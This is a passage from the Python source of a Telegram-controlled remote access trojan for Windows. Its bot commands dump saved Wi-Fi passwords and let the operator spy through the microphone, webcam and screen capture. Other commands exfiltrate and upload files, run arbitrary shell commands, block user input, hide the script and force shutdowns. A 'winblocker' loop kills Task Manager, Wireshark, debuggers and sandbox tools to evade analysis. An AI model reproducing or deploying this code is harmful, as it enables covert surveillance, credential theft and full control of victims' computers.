        ctypes.windll.user32.BlockInput(True)
        bot.send_message(message.chat.id , 'User\'s input (mouse and keyboard) successfully blocked!')

    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################
@bot.message_handler(commands=['unblock'])
def unblock(message):
    try:
        ctypes.windll.user32.BlockInput(False)
        bot.send_message(message.chat.id , 'User\'s input (mouse and keyboard) successfully unblocked!')
        bot.send_message(message.chat.id , 'If it\'s not unblocked run again: \n/unblock')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################
@bot.message_handler(commands=['enabletaskmgr'])
def disabtsk(message):       
    try:
        enable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
        os.popen(enable_command)
        bot.send_message(message.chat.id , 'taskmanager enabled!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
                
        
      
#############################################################################       
@bot.message_handler(commands=['wifilist'])
def wifipassword(message):
    
    a = os.popen('netsh wlan show profile').read().strip()
    bot.send_message(message.chat.id , f'Wifi networks📶:{a}')

################################

@bot.message_handler(commands=['wifipass'])
def wifipassword(message):
    name = message.text.split('/wifipass', 1)[1].strip()
    results = os.popen(f'netsh wlan show profile name={name} key=clear').read().strip()

    try:
        bot.send_message(message.chat.id ,str(results))
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")

#############################################################################


# @bot.message_handler(commands=['rotate'])
# def rotate(message):
#     angle = 0
#     angle = (angle + 90) % 360 
        
    
#     pyautogui.hotkey('ctrl', 'alt', {0: 'up', 90: 'right', 180: 'down', 270: 'left'}[angle])
#     bot.send_message(message.chat.id,f"rotated +{angle} degrees")







#############################################################################      

# @bot.message_handler(commands=['users'])

# def users(message):
    
#     try:
#         com = os.popen('net user').read().strip()
#         bot.send_message(message.chat.id, f'Res:{com}')
 
#         bot.send_message(message.chat.id, '####################################')
        
#         cm = os.popen('wmic useraccount list brief').read().strip()
#         bot.send_message(message.chat.id, f'Also:{cm}')
    
#     except Exception as e:
#         bot.send_message(message.chat.id, f'Error:{e}')
@bot.message_handler(commands=['users'])
def users(message):
    try:
        com_raw = os.popen('net user').read().strip()
        com_lines = com_raw.splitlines()
        com_output = "\n".join(com_lines)
        
        bot.send_message(message.chat.id, f'Res:\n{com_output}')
        bot.send_message(message.chat.id, '####################################')
        
        cm_raw = os.popen('wmic useraccount list brief').read().strip()
        cm_lines = cm_raw.splitlines()
        
        headers = cm_lines[0].split()
        data_rows = [line.split(maxsplit=len(headers)-1) for line in cm_lines[1:]]

        col_widths = [len(header) for header in headers]
        for row in data_rows:
            for i, item in enumerate(row):
                col_widths[i] = max(col_widths[i], len(item))
        
        def format_row(row):
            return " | ".join(item.ljust(col_widths[i]) for i, item in enumerate(row))
        
        header_row = format_row(headers)
        separator = "-+-".join("-" * width for width in col_widths)
        
        table = [header_row, separator] + [format_row(row) for row in data_rows]
        formatted_cm_output = "\n".join(table)
        
        bot.send_message(message.chat.id, f'Also:\n{formatted_cm_output}')
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
#############################################################################      
@bot.message_handler(commands=['hide'])
def hide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'Full path:{full_path}')

        os.popen(f'attrib +h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'your app is hidden!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
#############################################################################      

@bot.message_handler(commands=['unhide'])
def unhide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'Full path:{full_path}')

        os.popen(f'attrib -h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'your app is unhidden!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')


#############################################################################
@bot.message_handler(commands=['mic'])
def record_audio(message):
    if len(message.text.split()) > 1:
        try:
            record_time = int(message.text.split()[1]) 
        except ValueError:
            bot.reply_to(message, "Invalid record time. Please enter a valid number.")
            return
    else:
        record_time = 5

    
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    WAVE_OUTPUT_FILENAME = "6425s-3erq-eq44-vcx7.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    bot.send_message(message.chat.id, f"Recording audio for {record_time} seconds...")

    frames = []

    for i in range(0, int(RATE / CHUNK * record_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(message.chat.id, "Done recording")

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    os.remove(WAVE_OUTPUT_FILENAME)
    
@bot.message_handler(commands=['metadata'])
def get_metadata(message):
    filepath = message.text.split('/metadata', 1)[1].strip()

    if not os.path.exists(filepath):
        bot.send_message(message.chat.id, "Error: File does not exist")
        return

    try:
        statObject = os.stat(filepath)
        
        modificationTime = time.ctime(statObject[stat.ST_MTIME])
        
        sizeInMegaBytes = statObject[stat.ST_SIZE] / 1048576  
        sizeInMegaBytes = round(sizeInMegaBytes, 2)
        
        lastAccessTime = time.ctime(statObject[stat.ST_ATIME])
        
        fileMetadata = f"Last modified: {modificationTime}\n"
        fileMetadata += f"Size in MB: {sizeInMegaBytes} MB\n"
        fileMetadata += f"Last accessed: {lastAccessTime}\n"
        
        bot.send_message(message.chat.id, fileMetadata)
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")
###################################################################

@bot.message_handler(commands=['minimize'])
def minimize(message): 
    try:
        pyautogui.hotkey("win", "down")  
        bot.send_message(message.chat.id, "The active window has been minimized!")
        bot.send_message(message.chat.id, "Type the command again to minimize the window to the taskbar.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['maximize'])
def maximize(message): 
    try:
        pyautogui.hotkey("win", "up")
        bot.send_message(message.chat.id, "The active window has been maximized!")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
      
#################################################################################
        
@bot.message_handler(commands=['github'])
def github(message): 
    bot.send_message(message.chat.id, 'My github:')
    bot.send_message(message.chat.id, '[**GitHub - WhiteeRabbit**](https://github.com/WhiteeRabbit)')


#############################################################################
@bot.message_handler(commands=['cmdbomb'])
def cmdbomb(message):
    try:

        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
        bot.send_message(message.chat.id, 'Opened 10 CMD windows!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
        

#############################################################################
   
waiting_for_upload = False     


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Please send your file:")

@bot.message_handler(content_types=['document', 'photo', 'audio', 'video', 'voice'])
def handle_file(message):
    global waiting_for_upload
    if waiting_for_upload:
        try:
            file_name = message.document.file_name if message.document else message.photo.file_name
            file_info = bot.get_file(message.document.file_id) if message.document else bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as new_file:
                new_file.write(downloaded_file)
            directory = os.getcwd() 
            bot.send_message(message.chat.id, f'File has been sent successfully in: {directory}')
            waiting_for_upload = False
        except Exception as e:
            bot.send_message(message.chat.id, f'Error: {e}')
    else:
        bot.send_message(message.chat.id, 'Please enter the /upload command first')

#############################################################################

@bot.message_handler(commands=['altf4'])
def altf(message):
    try:
        pyautogui.hotkey('alt' , 'f4')
        bot.send_message(message.chat.id , 'ALT + F4 was pressed successfully')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}') 
#############################################################################
@bot.message_handler(commands=['run'])
def startfile(message):
    try:
        file = message.text.split('/run' , 1)[1].strip()
        os.popen(f'start {str(file)}')
        bot.send_message(message.chat.id, 'File opened successfully!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}') 

#############################################################################

@bot.message_handler(commands=['changeclipboard'])
def chgclip(message):
    try:
        text = message.text.split('/changeclipboard' , 1)[1].strip()
        
        command = 'echo | set /p nul=' + text.strip() + '| clip'
        os.system(command)
        bot.send_message(message.chat.id,f'Clipboard was changed to \"{text}\" successfully!') 
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}') 




#############################################################################
@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    
    bot.send_message(message.chat.id, "First run /upload and upload picture")

    bot.send_message(message.chat.id, "Then send name of photo to change desktop's wallpaper:")
    bot.register_next_step_handler(message, wall)
    
def wall(message):
    filename = message.text

    if not filename.startswith('/'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(str(filename)), 0)
            bot.send_message(message.chat.id, "Desktop's wallpaper successfully changed!")
    
        except Exception as e:
            bot.send_message(message.chat.id, f'Error{e}')


#############################################################################
@bot.message_handler(commands=['download'])

def download_file(message):
    download_file = message.text.split('/download', 1)[1].strip()
    try:      
        with open(download_file , 'rb') as file:
            if str(download_file[-3:]) == 'png':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'svg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpeg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'mkv':
                bot.send_video(message.chat.id, file , timeout=100)
            else:
                bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')

#############################################################################
@bot.message_handler(commands=['fullvolume'])

def volp(message):
    try:
        n = 0
        while n < 70:
            pyautogui.press('volumeup')
            n += 1
        

        bot.send_message(message.chat.id, 'successfully full!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeplus'])

def volp(message):
    try:
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        bot.send_message(message.chat.id, 'successfully +10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeminus'])

def volm(message):
    try:
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        bot.send_message(message.chat.id, 'successfully -10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['webcam'])

def camsw(message):
    bot.send_message(message.chat.id , 'Switch the camera (0 is default camera)')
    msg = bot.send_message(message.chat.id , 'Enter 0, 1, or another index:')
    bot.register_next_step_handler(msg, lambda msg: camv(msg, int(msg.text)))

def camv(message, camera_index):
    msg = bot.send_message(message.chat.id , 'Enter record time:')
    bot.register_next_step_handler(msg, lambda msg: camer(msg, camera_index, int(msg.text)))

def camer(message, camera_index, record_time):
    bot.send_message(message.chat.id , 'Please wait...')
    cap = cv2.VideoCapture(camera_index)

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_file = '498j-33v1-9d24-z390.mkv'
    output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))

    start_time = time.time()

    while True:
        ret, frame = cap.read()
        if ret:
            output_v.write(frame)
            if time.time() - start_time > record_time:
                break
        else:
            break

    cap.release()
    output_v.release()
    cv2.destroyAllWindows()

    try:
        with open(output_file, 'rb') as video_file:
            bot.send_document(message.chat.id, video_file, timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')

    os.remove('498j-33v1-9d24-z390.mkv')
#############################################################################
@bot.message_handler(commands=['help'])

def help(message):
    if n == False:
        bot.send_message(message.chat.id, "Enter password:")
        bot.register_next_step_handler(message, checkpasswd)
    else:
        bot.send_message(message.chat.id,textovik)
def checkpasswd(message):
    if message.text == 'acd':
        global n
        n = True
        bot.send_message(message.chat.id, 'Logged successfully!')
        bot.send_message(message.chat.id, textovik)
    else:
        bot.send_message(message.chat.id, 'password is wrong')


#################################################################################
@bot.message_handler(commands=['examples'])

def examples(message):
    bot.send_message(message.chat.id, examplestext)

#################################################################################

@bot.message_handler(commands=['textspech'])
def screen(message):
    try:
        text = message.text.split('/textspech', 1)[1].strip()
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        bot.send_message(message.chat.id , f'{text}  sended successfully!')

    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
#################################################################################
@bot.message_handler(commands=['screenrecord'])
def screen(message):
    
    msg = bot.send_message(message.chat.id , 'Enter record time:')
    bot.register_next_step_handler(msg, scr)
def scr(message):
    bot.send_message(message.chat.id , 'Please wait...')
    screen_width, screen_height = pyautogui.size()

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_video = cv2.VideoWriter('498j-33v1-9d24-z390.mkv', fourcc, 10.0, (screen_width, screen_height))


    start_time = time.time()


    while True:

        screenshot = pyautogui.screenshot()


        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        output_video.write(frame)

        if time.time() - start_time > int(message.text):
            break

    output_video.release()
    cv2.destroyAllWindows()

    try:    
        with open('498j-33v1-9d24-z390.mkv' , 'rb') as screenvideo:
            bot.send_document(message.chat.id , screenvideo , timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
    os.remove('498j-33v1-9d24-z390.mkv')


#################################################################################
@bot.message_handler(commands=['info'])
def information(message):
# about location
    try:
        
        result = os.popen('curl ipinfo.io/ip').read().strip()
        bot.send_message(message.chat.id,f"Ip:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/city').read().strip()
        bot.send_message(message.chat.id,f"City:\n {result}")
        
        ###########################################################
        
        
        result = os.popen('curl ipinfo.io/region').read().strip()
        bot.send_message(message.chat.id,f"Region:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/country').read().strip()
        bot.send_message(message.chat.id,f"Country:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/loc').read().strip()
        bot.send_message(message.chat.id,f"Location:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/org').read().strip()
        bot.send_message(message.chat.id,f"Provider:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/postal').read().strip()
        bot.send_message(message.chat.id,f"Postal:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/timezone').read().strip()
        bot.send_message(message.chat.id,f"Timezone:\n {result}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:{e}")
#################################################################################

@bot.message_handler(commands=['winblocker'])
def winblocker(message):
    bot.send_message(message.chat.id ,'Windows is blocked!')

    while True:
        c = os.popen('wmic process get description').read().strip()

        blacklisted_processes = [
                'perfmon.exe', 
                'Taskmgr.exe',
                'ProcessHacker.exe',
                'cmd.exe',
                'explorer.exe' ,
                'vmwareuser.exe',
                'fakenet.exe', 
                'dumpcap.exe', 
                'httpdebuggerui.exe', 
                'wireshark.exe', 
                'fiddler.exe', 
                'vboxservice.exe', 
                'df5serv.exe', 
                'vboxtray.exe', 
                'vmwaretray.exe', 
                'ida64.exe', 
                'ollydbg.exe', 
                'pestudio.exe', 
                'vgauthservice.exe', 
                'vmacthlp.exe', 
                'x96dbg.exe', 
                'x32dbg.exe', 
                'prl_cc.exe', 
                'prl_tools.exe', 
                'xenservice.exe', 
                'qemu-ga.exe', 
                'joeboxcontrol.exe', 
                'ksdumperclient.exe', 
                'ksdumper.exe', 
                'joeboxserver.exe', 
            ]

        for badproc in blacklisted_processes:
                
            if badproc in c:
                if badproc == 'cmd.exe':
                    pass
                else:
                    bot.send_message(message.chat.id ,f'{badproc} is killed!')
                os.popen(f'taskkill /f /im {badproc}')


#################################################################################

@bot.message_handler(commands=['winblocker2'])
def winblocker(message):
    bot.send_message(message.chat.id ,'Windows is blocked!')

    while True:
        c = os.popen('tasklist').read().strip()

        blacklisted_processes = [
                'perfmon.exe', 
                'Taskmgr.exe',
                'ProcessHacker.exe',
                'cmd.exe',
                'explorer.exe' ,
                'vmwareuser.exe',
                'fakenet.exe', 
                'dumpcap.exe', 
                'httpdebuggerui.exe', 
                'wireshark.exe', 
                'fiddler.exe', 
                'vboxservice.exe', 
                'df5serv.exe', 
                'vboxtray.exe', 
                'vmwaretray.exe', 
                'ida64.exe', 
                'ollydbg.exe', 
                'pestudio.exe', 
                'vgauthservice.exe', 
                'vmacthlp.exe', 
                'x96dbg.exe', 
                'x32dbg.exe', 
                'prl_cc.exe', 
                'prl_tools.exe', 
                'xenservice.exe', 
                'qemu-ga.exe', 
                'joeboxcontrol.exe', 
                'ksdumperclient.exe', 
                'ksdumper.exe', 
                'joeboxserver.exe', 
            ]

        for badproc in blacklisted_processes:
                
            if badproc in c:
                if badproc == 'cmd.exe':
                    pass
                else:
                    bot.send_message(message.chat.id ,f'{badproc} is killed!')
                os.popen(f'taskkill /f /im {badproc}')


###################################################################

@bot.message_handler(commands=['playsound'])
def plsound(message):
    try:
    
        muspath = message.text.split('/playsound', 1)[1].strip()

        os.popen(f'start {muspath}')
    
        bot.send_message(message.chat.id, 'Music started playing in pc successfully')

    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')    

###################################################################
@bot.message_handler(commands=['chrome'])
def opensite(message):
    try:
        site = message.text.split('/chrome', 1)[1].strip()
        os.popen(f'start chrome "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} has opened successfully')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['edge'])
def opensite(message):
    try:
        site = message.text.split('/edge', 1)[1].strip()
        os.popen(f'start msedge "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} has opened successfully')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['firefox'])
def opensite(message):
    try:
        site = message.text.split('/firefox', 1)[1].strip()
        os.popen(f'start firefox "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} has opened successfully')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        

#################################################################################
@bot.message_handler(commands=['webscreen'])
def take_photo(message):
    try:
        
        cap = cv2.VideoCapture(0)

        
        ret, frame = cap.read()

        
        photo_path = 'photo.jpg'
        cv2.imwrite(photo_path, frame)

        
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(photo_path)

        
        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"Error capturing photo: {e}")
#################################################################################

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    try:
        
        screenshot_path = 'screenshot.png'
        pyautogui.screenshot(screenshot_path)

        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(screenshot_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")

current_directory = os.getcwd()

#################################################################################

@bot.message_handler(commands=['sleep'])
def slip(message):
    try:
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        bot.send_message(message.chat.id, 'Pc is sendend to sleep mode!') 
    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")


#################################################################################


@bot.message_handler(commands=['cd'])
def change_directory_command(message):
    try:
        global current_directory 
        new_directory = message.text.split('/cd', 1)[1].strip()
        
        
        os.chdir(new_directory)
        current_directory = os.getcwd()
        
        bot.send_message(message.chat.id, f"You are in this directory:\n{current_directory}")
    except Exception as e:
        bot.send_message(message.chat.id, f"This directory does not exists: {e}")


#################################################################################



@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    
    result = os.popen('whoami').read().strip()

    
    bot.send_message(message.chat.id, f'result: {result}')
 
 
 
#################################################################################
    
execute_enabled = False  

def execute_command(command):
    global execute_enabled

    try:
        if command.lower() == 'exit':
            execute_enabled = False
            return "Exit"

        elif command.lower() == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            return f"You are in: {parent_directory}"

        elif command.lower().startswith('cd '):
            directory = command.lower().split(' ', 1)[1].strip()
            os.chdir(directory)
            return f"You are in: {directory}"

        else:
            result = os.popen(command.lower()).read()
            return f"Result:\n\n{result}"

    except Exception as e:
        return f"Error:\n\n{e}"

@bot.message_handler(commands=['execute'])
def handle_execute(message):
    global execute_enabled
    execute_enabled = True
    bot.send_message(message.chat.id, "Enter  your command(enter \"exit\", if you want to exit):")

@bot.message_handler(func=lambda message: execute_enabled)
def handle_command(message):
    command_result = execute_command(message.text)
    bot.send_message(message.chat.id, command_result)

############################################################################
#old execute with bugs
'''@bot.message_handler(commands=['execute'])
def handle_execute(message):
    bot.send_message(message.chat.id, "enter command for execution (enter 'exit' if you want to exit):")

@bot.message_handler(func=lambda message: True)
def handle_command(message):
    try:
        if message.text.lower() == 'exit':
            bot.send_message(message.chat.id, "Exit")
            
        elif message.text.lower() == 'cd..':
                current_directory = os.getcwd()
                parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
                os.chdir(parent_directory)
                bot.send_message(message.chat.id, f"You are in: {parent_directory}")
        elif message.text.lower().startswith('cd '):
                directory = message.text.lower().split(' ', 1)[1].strip()
                os.chdir(directory)
                bot.send_message(message.chat.id, f"You are in: {directory}")
        else:
                res = os.popen(message.text.lower()).read()
                bot.send_message(message.chat.id, f"Result:\n\n{res}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
    '''
    
    
##################################################################
    

@bot.message_handler(commands=['shellexecute'])

def command_execution(message):
    
    command = message.text.split('/shellexecute', 1)[1].strip()
    res = os.popen(command).read()
    
    bot.send_message(message.chat.id, f"Result of command:\n\n{res}")
    
@bot.message_handler(commands=['e'])

def command_execution(message):
    try:
        command = message.text.split('/e', 1)[1].strip()
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {directory}")
        else:
            res = os.popen(command).read()
            bot.send_message(message.chat.id, f"Result:\n\n{res}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
    
#################################################################################
    
    
MAX_MESSAGE_LENGTH = 4096

@bot.message_handler(commands=['ex'])
def command_execution(message):
    try:
        command = message.text.split('/ex', 1)[1].strip()
        
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
            
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {os.getcwd()}")
            
        else:
            res = os.popen(command).read()
            
            
            res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
            if len(res_chunks) > 1:
                
                with open('_windows_.txt', 'w', encoding='utf-8') as file:
                    file.write(res)
                    os.popen( "attrib +h r.txt" )
                with open('_windows_.txt', 'rb') as document:
                    bot.send_document(message.chat.id, document)
                os.remove('_windows_.txt')
            else:
                
                for res_chunk in res_chunks:
                    bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
#################################################################################
@bot.message_handler(commands=['shutdown'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /s /f /t 0')
        
        bot.send_message(message.chat.id, "pc is shutdowned!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')


#################################################################################


@bot.message_handler(commands=['restart'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /r /f /t 0')

        bot.send_message(message.chat.id, "pc is restarted!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')
        
        
#################################################################################

@bot.message_handler(commands=['tasklist'])
def command_execution(message):
    try:
        command = 'tasklist'
        

        res = os.popen(command).read()
            
            
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows_.txt')
        
        res = os.popen('wmic process get description').read().strip()
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows2_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows2_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows2_.txt')        
        
        else:
                
            for res_chunk in res_chunks:
                bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

if __name__ == "__main__":

    bot.polling(none_stop=True)


#################################################################################